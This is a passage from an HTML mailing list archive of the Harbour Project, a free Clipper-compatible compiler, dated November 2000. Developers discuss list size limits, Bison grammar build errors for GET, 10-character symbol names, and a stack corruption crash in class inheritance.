FAQ................: <A HREF="http://www.harbour-project.org/faq/harbour.html">http://www.harbour-project.org/faq/harbour.html</A>
My harbour page....: <A HREF="http://www.hagbard.demon.co.uk/harbour/">http://www.hagbard.demon.co.uk/harbour/</A>

</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 08:50:03 2000
Date: Fri Nov  3 08:50:03 2000
From: =?big5?B?ufml1g==?= harbour@lists.harbour-project.org
Subject: [Harbour] testbrw.prg Compiler error!!

<PRE>Yes!! Now is ok!!

&gt;<i> I´ll fix the TestBrw.prg since it was I who broked
</I>



</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 08:57:02 2000
Date: Fri Nov  3 08:57:02 2000
From: Phil Barnett harbour@lists.harbour-project.org
Subject: [Harbour] Mailing list suggestions.

<PRE>On 3 Nov 2000, at 10:11, Patrick Mast, Harbour wrote:


&gt;<i> I vote for 70K.
</I>
Noted.
 
&gt;<i> &gt; If I understand the process correctly, mailman will not lose the
</I>&gt;<i> &gt; messages but will block the mail for administrative approval, mail
</I>&gt;<i> &gt; an administrative alert and mail the sender a notice.
</I>&gt;<i> So the mail goes to Tim, or to you Phil?
</I>
The mail goes on hold for approval or rejection. It stays on hold on 
the mailman server. The list manager can view it to see if it needs 
to be approved or rejected.


-- 
              Phil Barnett  mailto:<A HREF="mailto:midnight@the-oasis.net">midnight@the-oasis.net</A>
                       WWW  <A HREF="http://www.the-oasis.net/">http://www.the-oasis.net/</A>
                  FTP Site  <A HREF="ftp://ftp.the-oasis.net">ftp://ftp.the-oasis.net</A>

</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 09:00:03 2000
Date: Fri Nov  3 09:00:03 2000
From: Phil Barnett harbour@lists.harbour-project.org
Subject: [Harbour] Mailing list suggestions.

<PRE>On 3 Nov 2000, at 7:25, Dave Pearson wrote:

&gt;<i> What was the nature of the emails over the limit you propose? How many
</I>&gt;<i> should not have been allowed onto the list and how many should have
</I>&gt;<i> been. I think that's a better measure.
</I>
We haven't had much spam here.

&gt;<i> &gt; If I understand the process correctly, mailman will not lose the
</I>&gt;<i> &gt; messages but will block the mail for administrative approval, mail
</I>&gt;<i> &gt; an administrative alert and mail the sender a notice.
</I>&gt;<i> &gt; 
</I>&gt;<i> &gt; Comments?
</I>&gt;<i> 
</I>&gt;<i> What then happens to said email? Does the admin get to approve it and
</I>&gt;<i> allow it onto the list or is it simply rejected and the sender is
</I>&gt;<i> expected to reduce it in size?
</I>
It goes on hold for approval.

&gt;<i> If we really do need a size filter I'd have thought it best to set it
</I>&gt;<i> to something in excess of 100k.
</I>
Noted.
 
&gt;<i> On the other hand, if such a filter simply causes problems for people
</I>&gt;<i> who quote upside down and don't know how to cleanly snip and quote in
</I>&gt;<i> context then I'm all for it.
</I>
Yeah, me, too. I've been looking for that one...


-- 
              Phil Barnett  mailto:<A HREF="mailto:midnight@the-oasis.net">midnight@the-oasis.net</A>
                       WWW  <A HREF="http://www.the-oasis.net/">http://www.the-oasis.net/</A>
                  FTP Site  <A HREF="ftp://ftp.the-oasis.net">ftp://ftp.the-oasis.net</A>

</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 10:26:02 2000
Date: Fri Nov  3 10:26:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET

<PRE>John,

It probably is the _order_ of the production in the make file. Make sure
that Bison is run *before* trying to compile harbour.slx. Harbour.slx needs
harboury.h which is created by Bison and #defines the parser tokens. GET is
a new Token and is not found in your old version of harboury.h.

Finally, make sure your batch file uses harbour.sly _instead_ of harbour.y

Let me know if this helps.

Ron

&gt;<i> [To Ron]
</I>&gt;<i>
</I>&gt;<i> Sorry, I got another CVS update but I still can't get the simplex
</I>&gt;<i> version to compile. :-(
</I>&gt;<i>
</I>&gt;<i> Compiling source\compiler\hbslex.c I get from VC++:
</I>&gt;<i> source\compiler\harbour.slx(269) : error C2065: 'GET' :
</I>&gt;<i> undeclared identifier
</I>&gt;<i>
</I>&gt;<i> Where is GET declared (or meant to be)?
</I>&gt;<i>
</I>&gt;<i> John.
</I>

</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 10:33:02 2000
Date: Fri Nov  3 10:33:02 2000
From: Dave Pearson harbour@lists.harbour-project.org
Subject: [Harbour] Mailing list suggestions.

<PRE>On Fri, Nov 03, 2000 at 08:59:39AM -0500, Phil Barnett wrote:
&gt;<i> On 3 Nov 2000, at 7:25, Dave Pearson wrote:
</I>&gt;<i> 
</I>&gt;<i> &gt; What was the nature of the emails over the limit you propose? How many
</I>&gt;<i> &gt; should not have been allowed onto the list and how many should have
</I>&gt;<i> &gt; been. I think that's a better measure.
</I>&gt;<i> 
</I>&gt;<i> We haven't had much spam here.
</I>
Actually, in the year and a half (or there about) that we've had a harbour
mailing list I don't think we've seen anything that can really be called
&quot;spam&quot;. At least, not in the UCE sense of the term.

&gt;<i> &gt; What then happens to said email? Does the admin get to approve it and
</I>&gt;<i> &gt; allow it onto the list or is it simply rejected and the sender is
</I>&gt;<i> &gt; expected to reduce it in size?
</I>&gt;<i> 
</I>&gt;<i> It goes on hold for approval.
</I>
Ahh, just like majordomo then. As long as the list admins don't mind the
extra work (and I'm guessing it would be a rare thing) that seems like a
reasonable way of dealing with people who lack any manners when it comes to
email composition.

&gt;<i> &gt; On the other hand, if such a filter simply causes problems for people
</I>&gt;<i> &gt; who quote upside down and don't know how to cleanly snip and quote in
</I>&gt;<i> &gt; context then I'm all for it.
</I>&gt;<i> 
</I>&gt;<i> Yeah, me, too. I've been looking for that one...
</I>
I keep meaning to write an &quot;upside down quotes&quot; filter. Part of me says it
should simply look for &quot;Outlook&quot; in the headers but I think that's a little
unfair of me. ;&gt;

Dave &quot;flamebait, moi?&quot; Pearson

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: <A HREF="http://www.harbour-project.org/">http://www.harbour-project.org/</A>
FAQ................: <A HREF="http://www.harbour-project.org/faq/harbour.html">http://www.harbour-project.org/faq/harbour.html</A>
My harbour page....: <A HREF="http://www.hagbard.demon.co.uk/harbour/">http://www.hagbard.demon.co.uk/harbour/</A>

</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 11:26:02 2000
Date: Fri Nov  3 11:26:02 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] Re: PP Problem with dbClearRel

<PRE>[To Victor Szakats]

&quot;10 char ... support ... can set ... name length by compiling Harbour
with the  HB_SYMBOL_NAME_LEN macro set to the required value&quot;

I think people would like longer than 10 (63 sounds OK) but also to
have 10-char equivalents for the Clipper names that are longer than 10
if specified in full.  (Obviously one can argue that the full Clipper
name is no more than 10 but let's not. &lt;g&gt;)

Thinking about it, maybe just a CH file mapping the 10-char ones to
their longer version would be good enough in practice.  Hmmm... would
probably have to be part of STD.CH.  Perhaps with #ifndef / #endif
round them so anyone could turn them off (but why would they?).

Oh, the above doesn't make 10-char equivalents work at runtime. :-(
Pity - it seemed easy, efficient, etc. :-)

The alternative is perhaps to map the longer names to 10 chars.  I
actually do that in C4W in some cases, apparently with no complaints
or problems. :-)  However, shortening names doesn't feel nice...

John.

</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 12:40:05 2000
Date: Fri Nov  3 12:40:05 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] Re: PP Problem with dbClearRel

<PRE>Victor:
If the default is 63, does that mean, as Alexander suggested, that any
Clip53/RTL functions in Harbour should be limited to 10 chars in length?
For instance, dbClearRel() in app code doesn't call dbClearRelation right
now.

Brian Hays
Abacus Data Systems, Inc

----- Original Message -----
From: &quot;Victor Szakats&quot; &lt;<A HREF="mailto:vector@mail.matav.hu">vector@mail.matav.hu</A>&gt;
To: &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
Sent: Friday, November 03, 2000 3:18 am
Subject: Re: [Harbour] Re: PP Problem with dbClearRel


&gt;<i> John, Brian,
</I>&gt;<i>
</I>&gt;<i> 10 char (or whatever the number is) support is right there in the current
</I>source,
&gt;<i> you can set the symbol name length by compiling Harbour with the
</I>&gt;<i> HB_SYMBOL_NAME_LEN macro set to the required value. The default is
</I>&gt;<i> 63 currently. Check INCLUDE/HBSETUP.H for more info.
</I>&gt;<i>
</I>&gt;<i> Any new symbol length dependent code (like the RDD) should/can use this
</I>value.
&gt;<i>
</I>&gt;<i> Victor Szakats
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i>
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i>
</I>

</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 13:44:02 2000
Date: Fri Nov  3 13:44:02 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET

<PRE>[To Ron]

&quot;It probably is the _order_ of the production in the make file&quot;

That helped (later, once I fixed my first mistake - read on).

&quot;make sure your batch file uses harbour.sly _instead_ of harbour.y&quot;

Oops!  That was what was causing the error.  When I did a diff I
failed to notice it - sorry!!

About here I also needed that other change above.

Now it got a lot further, and then hit an error that looks genuine
to me: macro.slx doesn't set YY_DECL to what yylex() really is - it
fails to mention its 2nd param.

I changed it to:
   #define YY_DECL int yylex( YYSTYPE *yylval_ptr, HB_MACRO_PTR pMacro )
and now it all compiled &amp; linked.

This reminds me: I had to change macro.y for VC++ (without slx) for
a similar kind of thing.  If I ever get a stable (!) build that's
another few changes I'll feed back. &lt;g&gt;

---

Aha!  Looks like it all works: my test (@ ... GET arr[i]) runs OK. &lt;g&gt;

Hmm... it's great so far, but am I right that the grammar is looking
for an array GET followed by &quot;:&quot; - actually, in the form
  _GET_(arr[...], ...):
?  I was sort of expecting (!) it would not need that final &quot;:&quot;.

However, it's OK. :-)  I can work around that. :-)

But, please can you put functions __GET(), __GETA() and any others
in a separate file, i.e. not in TGET.PRG.  I need to be able to use
C4W-specific ones because I need them _not_ to call Get():New() but
instead call a C4WGet():New().

That's because I need to change what :Display() does and probably
also some other things.  Other add-ons could well find this rather
useful, too...

John.

</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 13:59:01 2000
Date: Fri Nov  3 13:59:01 2000
From: Marek Paliwoda harbour@lists.harbour-project.org
Subject: Odp: [Harbour] Re: dynsym.c caused GPF

<PRE>&gt;<i> Maurilio,
</I>&gt;<i>
</I>&gt;<i> I can't reproduce your problem here :-((((
</I>&gt;<i>
</I>&gt;<i> Perhaps, it's my fault, It is possible I have so simplified your
</I>&gt;<i> program it does'nt GPF anymore.
</I>&gt;<i>
</I>&gt;<i> Could you please try to compile the 3 files within test.zip attached
</I>&gt;<i> and let me know if it GPF or no.
</I>&gt;<i>
</I>&gt;<i> I think I have the same inheritence you had.
</I>&gt;<i>
</I>&gt;<i> _Take_CARE_!!!! the name of the files within test.zip will collide
</I>&gt;<i> with yours !!!! farmaq.prg, tfarmaq.prg and tsqlbrw.prg !!!!!!!!
</I>&gt;<i>
</I>&gt;<i> Please try it and let me know the result.
</I>
Maurilio, Jean,

The error apeares exactly just like Maurilio described in his posts.
I tested this on my Linux box with the same effects as Maurilio had.

My short investigation showed me that inside __ClsInstSuper func
a local variable pString becomes corrupted after recursivley
executing

         /* Instance a Super class */
         hb_vmPushSymbol( pDynSym-&gt;pSymbol );
         hb_vmPushNil();
         hb_vmFunction( 0 );

when this sequence of inheritance is done : TScegliQuery -&gt;
TBrowseSQL -&gt; TBrowse -&gt; TObject.  Because pString is simply
a pointer to a stack, seems to me that for some reasons  a stack
becomes corrupted after some sequence.of execution. You can
also reproduce this kind of error by moving a logic done after
F2 key press to a separate function.

Seems to me that Ryszard knows much more about this issue
(see his email about harbour locals).

Regards
Marek Paliwoda




</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 14:22:02 2000
Date: Fri Nov  3 14:22:02 2000
From: Victor Szakats harbour@lists.harbour-project.org
Subject: [Harbour] Re: PP Problem with dbClearRel

<PRE>John,


&gt;<i> I think people would like longer than 10 (63 sounds OK) but also to
</I>&gt;<i> have 10-char equivalents for the Clipper names that are longer than 10
</I>&gt;<i> if specified in full.  (Obviously one can argue that the full Clipper
</I>&gt;<i> name is no more than 10 but let's not. &lt;g&gt;)
</I>
Just try this: SET CFLAGS=-DHB_SYMBOL_NAME_LEN=10

I'm not saying it will solve _all_ 10 chars issues (*), but probably the most 
of them, including the dbClearRelation() (or was it dbSetRelation() ?) 
problem mentioned a few days ago. The compiler and runtime will 
take care of this.

(*)
- .MEM files comes to mind, but that's a 10 chars vs. non-10 chars 
symbol name length incompatibility issue.
- C extend functions have some other issues with symbol name length, 
since you've to use full length function names when compiling for Harbour, 
and 10 char long ones when compiling for CA-Clipper.

&gt;<i> Thinking about it, maybe just a CH file mapping the 10-char ones to
</I>&gt;<i> their longer version would be good enough in practice.  Hmmm... would
</I>&gt;<i> probably have to be part of STD.CH.  Perhaps with #ifndef / #endif
</I>&gt;<i> round them so anyone could turn them off (but why would they?).
</I>&gt;<i> 
</I>&gt;<i> Oh, the above doesn't make 10-char equivalents work at runtime. :-(
</I>&gt;<i> Pity - it seemed easy, efficient, etc. :-)
</I>&gt;<i> 
</I>&gt;<i> The alternative is perhaps to map the longer names to 10 chars.  I
</I>&gt;<i> actually do that in C4W in some cases, apparently with no complaints
</I>&gt;<i> or problems. :-)  However, shortening names doesn't feel nice...
</I>
For me neither. I think dbSet/ClearRelation() should be left as it is, and 
for those who find this a problem, there's always the 10chars Harbour.

Victor Szakats



</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 14:27:02 2000
Date: Fri Nov  3 14:27:02 2000
From: Victor Szakats harbour@lists.harbour-project.org
Subject: [Harbour] Re: PP Problem with dbClearRel

<PRE>Brian,


&gt;<i> If the default is 63, does that mean, as Alexander suggested, that any
</I>&gt;<i> Clip53/RTL functions in Harbour should be limited to 10 chars in length?
</I>
Sortof, since we want to keep support for 10 char compatibility mode, all the 
Harbour callable public symbols should have a unique first 10 chars. That 
doesn't mean that it can't be longer, but it means that only the first 10 will 
be significant when compiling Harbour in 10 chars mode.

&gt;<i> For instance, dbClearRel() in app code doesn't call dbClearRelation right
</I>&gt;<i> now.
</I>
That's a user application problem, Harbour should always use the complete 
form (dbClearRelation()). From that point the user should decide to correct 
his/her code to also use the complete form, or to use Harbour in 10 chars 
compatibility mode. I would surely recommend the first solution.

&gt;<i>From a field name POV, I think those should be internally truncated to 
</I>HB_SYMBOL_NAME_LEN.

Victor Szakats



</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 15:26:03 2000
Date: Fri Nov  3 15:26:03 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] Re: PP Problem with dbClearRel

<PRE>Victor:
Thanks for the clarifications.  I do like the long names, and am changing
the app code, but this sprang from a header file issue.

Harbour didn't seem to have any of the SCOPE commands preprocessed, so I had
pulled in the clip53 ORD.CH (Alexander you were right!) and this was giving
me the dbClearRel() short names.

Shouldn't we be distributing the equivalent of an ord.ch?  I also needed
this for the dbInfo constants, which are currently defined only in
hbapirdd.h, which isn't something app code should be including...

Brian Hays
Abacus Data Systems, Inc

----- Original Message -----
From: &quot;Victor Szakats&quot; &lt;<A HREF="mailto:vector@mail.matav.hu">vector@mail.matav.hu</A>&gt;
To: &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
Sent: Friday, November 03, 2000 11:27 am
Subject: Re: [Harbour] Re: PP Problem with dbClearRel


&gt;<i> Brian,
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> &gt; If the default is 63, does that mean, as Alexander suggested, that any
</I>&gt;<i> &gt; Clip53/RTL functions in Harbour should be limited to 10 chars in length?
</I>&gt;<i>
</I>&gt;<i> Sortof, since we want to keep support for 10 char compatibility mode, all
</I>the
&gt;<i> Harbour callable public symbols should have a unique first 10 chars. That
</I>&gt;<i> doesn't mean that it can't be longer, but it means that only the first 10
</I>will
&gt;<i> be significant when compiling Harbour in 10 chars mode.
</I>&gt;<i>
</I>&gt;<i> &gt; For instance, dbClearRel() in app code doesn't call dbClearRelation
</I>right
&gt;<i> &gt; now.
</I>&gt;<i>
</I>&gt;<i> That's a user application problem, Harbour should always use the complete
</I>&gt;<i> form (dbClearRelation()). From that point the user should decide to
</I>correct
&gt;<i> his/her code to also use the complete form, or to use Harbour in 10 chars
</I>&gt;<i> compatibility mode. I would surely recommend the first solution.
</I>&gt;<i>
</I>&gt;<i> From a field name POV, I think those should be internally truncated to
</I>&gt;<i> HB_SYMBOL_NAME_LEN.
</I>&gt;<i>
</I>&gt;<i> Victor Szakats
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i>
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i>
</I>

</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 15:54:02 2000
Date: Fri Nov  3 15:54:02 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET

<PRE>[To Ron]

I guess the real plan is to change the PP's table for @ GET so it
puts out something special where the code block is needed, maybe:
  _GET_( ... __BLK__( &lt;var&gt; ) ...)
so that special grammar rules can do the right thing but in a more
general way than now?  I.e. they would be based on __BLK__( ... )
rather than on _GET_( ... ).

Hmm...  I notice the PP tables need change(s) anyway.  This:
  @ ... GET u
fails to do what's intended. :-(

I know, no-one uses a var called u.  But it should work even if they
do. :-)

John.

</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 16:02:01 2000
Date: Fri Nov  3 16:02:01 2000
From: Jose Lalin harbour@lists.harbour-project.org
Subject: [Harbour] Ideas about mailing list features.

<PRE>Hi,
may a propose to use the &quot;Hetiquette&quot;. It is the &quot;Harbour Etiquette&quot;
which everybody should use in the list.

To Phil/Tim:
* Put a limit to the mail size (50kb to 100Kb)
* Remove people which sends spam to the list
* Is there a way to transform HTML posts to plain text when they arrive
to the server ?

To Patrick,
these should be added in the Web site as: &quot;Follow this rules when
posting to the Harbour mailing list&quot;:

* No HTML post, only plain text
* No binaries (JPG, BMP) others than ZIP's with source/docs/tests
* No messages with &quot;the &lt;3rd party lib&gt; doesn't work with Harbour&quot;
* Warn people about to not include the replied message when not
necesary.

WM_Thanks,
Jose Lalin

</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 16:12:01 2000
Date: Fri Nov  3 16:12:01 2000
From: JF Lefebvre harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>To all involved (At least maurillio, Brian and Ryszard),

After many hours trying to find something wrong with the class 
inheritance, I'm near to admit it's probably not a problem for me.

Somewhere a pointer became nil when it should not :-((( and I can't 
see any good or bad reason for that in my code. I really hope 
Ryszard could find something wrong, either with it's logic or some 
incompatibility (feel free to point me on Ryszard, so I could help !! ) 
between my code and the GC.

Totaly desesparate ...

See you all,

&gt;<i> &gt; Maurilio,
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; I can't reproduce your problem here :-((((
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Perhaps, it's my fault, It is possible I have so simplified your
</I>&gt;<i> &gt; program it does'nt GPF anymore.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Could you please try to compile the 3 files within test.zip attached and
</I>&gt;<i> &gt; let me know if it GPF or no.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; I think I have the same inheritence you had.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; _Take_CARE_!!!! the name of the files within test.zip will collide
</I>&gt;<i> &gt; with yours !!!! farmaq.prg, tfarmaq.prg and tsqlbrw.prg !!!!!!!!
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Please try it and let me know the result.
</I>&gt;<i> 
</I>&gt;<i> Maurilio, Jean,
</I>&gt;<i> 
</I>&gt;<i> The error apeares exactly just like Maurilio described in his posts.
</I>&gt;<i> I tested this on my Linux box with the same effects as Maurilio had.
</I>&gt;<i> 
</I>&gt;<i> My short investigation showed me that inside __ClsInstSuper func
</I>&gt;<i> a local variable pString becomes corrupted after recursivley
</I>&gt;<i> executing
</I>&gt;<i> 
</I>&gt;<i>          /* Instance a Super class */
</I>&gt;<i>          hb_vmPushSymbol( pDynSym-&gt;pSymbol );
</I>&gt;<i>          hb_vmPushNil();
</I>&gt;<i>          hb_vmFunction( 0 );
</I>&gt;<i> 
</I>&gt;<i> when this sequence of inheritance is done : TScegliQuery -&gt;
</I>&gt;<i> TBrowseSQL -&gt; TBrowse -&gt; TObject.  Because pString is simply
</I>&gt;<i> a pointer to a stack, seems to me that for some reasons  a stack
</I>&gt;<i> becomes corrupted after some sequence.of execution. You can
</I>&gt;<i> also reproduce this kind of error by moving a logic done after
</I>&gt;<i> F2 key press to a separate function.
</I>&gt;<i> 
</I>&gt;<i> Seems to me that Ryszard knows much more about this issue
</I>&gt;<i> (see his email about harbour locals).
</I>&gt;<i> 
</I>&gt;<i> Regards
</I>&gt;<i> Marek Paliwoda
</I>&gt;<i> 
</I>&gt;<i> 
</I>&gt;<i> 
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> 
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i> 
</I>&gt;<i> 
</I>


Best regards,

J. Lefebvre,
Bruxelles,
Belgium


</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 16:26:02 2000
Date: Fri Nov  3 16:26:02 2000
From: JF Lefebvre harbour@lists.harbour-project.org
Subject: [Harbour] 2000-11-03 22:30 UTC+0100 (for) Charles,Kwon <jfl@mafact.com>

<PRE>2000-11-03 22:30 UTC+0100 (for) Charles,Kwon &lt;<A HREF="mailto:jfl@mafact.com">jfl@mafact.com</A>&gt;
   * source/lang/msgko.c
      Charles,Kwon update as requested ...


Best regards,

J. Lefebvre,
Bruxelles,
Belgium


</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 17:46:01 2000
Date: Fri Nov  3 17:46:01 2000
From: Andrzej P. Wozniak harbour@lists.harbour-project.org
Subject: [Harbour] Mailing list suggestions.

<PRE>----- Original Message -----
From: &quot;Phil Barnett&quot; &lt;<A HREF="mailto:midnight@the-oasis.net">midnight@the-oasis.net</A>&gt;
To: &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
Sent: Friday, November 03, 2000 2:44 AM
Subject: [Harbour] Mailing list suggestions.


&gt;<i>
</I>&gt;<i> Of the last 7500 messages on <A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>,
</I>&gt;<i> (and I'm not counting the 500k message from last week)
</I>&gt;<i>
</I>&gt;<i> 1 was larger than 500k
</I>&gt;<i> 10 were larger than 100k
</I>&gt;<i> 12 were larger than 90k
</I>&gt;<i> 13 were larger than 80k
</I>&gt;<i> 14 were larger than 70k
</I>&gt;<i> 17 were larger than 60k
</I>&gt;<i> 19 were larger than 50k
</I>&gt;<i> 25 were larger than 40k
</I>&gt;<i>
</I>&gt;<i> I propose we put a size limit on messages at 50k.
</I>&gt;<i>
</I>&gt;<i> If I understand the process correctly, mailman will not lose the
</I>&gt;<i> messages but will block the mail for administrative approval, mail
</I>&gt;<i> an administrative alert and mail the sender a notice.
</I>
Phil,

MS Outlook Express uses 60KB limit by default and we should stay on it, I
think.
And what about HTML posting - an automagic warning is a must.

(
--
Regards from the Harbour mirror in Poland
Andrzej P. Wozniak
<A HREF="mailto:alias@polnet.cc">alias@polnet.cc</A>   <A HREF="mailto:harbour@harbour.pl.eu.org">harbour@harbour.pl.eu.org</A>


</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 17:56:01 2000
Date: Fri Nov  3 17:56:01 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] Re: dynsym.c caused GPF

<PRE>JF: 
Did you get the zip I sent you?

Brian Hays



</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 18:49:01 2000
Date: Fri Nov  3 18:49:01 2000
From: Paul Tucker harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET (john)

<PRE>John,

&gt;&gt;<i> This reminds me: I had to change macro.y for VC++ (without slx) for a
</I>similar kind of thing.  If I ever get a stable (!) build that's another few
changes I'll feed back. &lt;g&gt; &lt;&lt;

What version of Bison are you using?

Paul




</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 18:49:09 2000
Date: Fri Nov  3 18:49:09 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] 2000-11-03 15:50 UTC+0800 Ron Pinkas <ron@profit-master.com>

<PRE>2000-11-03 15:50 UTC+0800 Ron Pinkas &lt;<A HREF="mailto:ron@profit-master.com">ron@profit-master.com</A>&gt;
   * source/compiler/harbour.sly
     + Added rule to accept Get and GetA as FunCall

   * source/compiler/harbour.l
     + Added support for pseudo function _GET_()
   * source/compiler/harbour.y
     + Added _GET_(...) =&gt; __GET(...)/__GETA(...) logic from harbour.sly

   * source/macro/macro.slx
     * Corrected YY_DECL #define (Thanks John)

   * source/rtl/tget.prg
   * include/hbextern.ch
     - Removed no longer needed _GET_()

</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 18:56:02 2000
Date: Fri Nov  3 18:56:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET

<PRE>John

&gt;<i> [To Ron]
</I>...
&gt;<i> I changed it to:
</I>&gt;<i>    #define YY_DECL int yylex( YYSTYPE *yylval_ptr, HB_MACRO_PTR pMacro )
</I>&gt;<i> and now it all compiled &amp; linked.
</I>
Fixed, thanks.

&gt;<i> Aha!  Looks like it all works: my test (@ ... GET arr[i]) runs OK. &lt;g&gt;
</I>
Great!

&gt;<i> Hmm... it's great so far, but am I right that the grammar is looking
</I>&gt;<i> for an array GET followed by &quot;:&quot; - actually, in the form
</I>&gt;<i>   _GET_(arr[...], ...):
</I>&gt;<i> ?  I was sort of expecting (!) it would not need that final &quot;:&quot;.
</I>&gt;<i>
</I>&gt;<i> However, it's OK. :-)  I can work around that. :-)
</I>
Fixed! Now _GET_(...) will be accepted wherever a function call is accepted.

&gt;<i> But, please can you put functions __GET(), __GETA() and any others
</I>&gt;<i> in a separate file, i.e. not in TGET.PRG.  I need to be able to use
</I>&gt;<i> C4W-specific ones because I need them _not_ to call Get():New() but
</I>&gt;<i> instead call a C4WGet():New().
</I>&gt;<i>
</I>&gt;<i> That's because I need to change what :Display() does and probably
</I>&gt;<i> also some other things.  Other add-ons could well find this rather
</I>&gt;<i> useful, too...
</I>
Not sure I agree here. It seems this would be the right place for this
functions (Victor?). It seems easy to extract those functions and include in
your replacement file, when replacement Get is used.

I'll let someone else proceed with this...

Ron


</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 18:58:02 2000
Date: Fri Nov  3 18:58:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET (Ryszard)

<PRE>Ignacio,

Done.

Ron

&gt;<i> Ron,
</I>&gt;<i> 
</I>&gt;<i> &gt;&gt;I'll try to copy same into harbour.y next week.
</I>&gt;<i> 
</I>&gt;<i> I really appreciate that. Thank you so much.
</I>&gt;<i> 
</I>&gt;<i> Regards,
</I>&gt;<i> 
</I>&gt;<i> Ignacio Ortiz
</I>&gt;<i> Email: <A HREF="mailto:ignacio@ozs.com">ignacio@ozs.com</A>
</I>&gt;<i> http: www.ozs.com
</I>

</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 19:15:04 2000
Date: Fri Nov  3 19:15:04 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] 2000-11-03 16:05 UTC+0800 Ron Pinkas <ron@profit-master.com>

<PRE>2000-11-03 16:05 UTC+0800 Ron Pinkas &lt;<A HREF="mailto:ron@profit-master.com">ron@profit-master.com</A>&gt;
   * source/pp/pptable.c
     * Changed {|u| to {|_1| and := u to := _1 in bSetGet of _GET_(...) to
avoid unexpected result with @ X,Y GET u


</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 19:16:01 2000
Date: Fri Nov  3 19:16:01 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET

<PRE>John,

&gt;<i> I guess the real plan is to change the PP's table for @ GET so it
</I>&gt;<i> puts out something special where the code block is needed, maybe:
</I>&gt;<i>   _GET_( ... __BLK__( &lt;var&gt; ) ...)
</I>&gt;<i> so that special grammar rules can do the right thing but in a more
</I>&gt;<i> general way than now?  I.e. they would be based on __BLK__( ... )
</I>&gt;<i> rather than on _GET_( ... ).
</I>
Do you have in mind any other scenario that would benefit from this
generalization?

&gt;<i> Hmm...  I notice the PP tables need change(s) anyway.  This:
</I>&gt;<i>   @ ... GET u
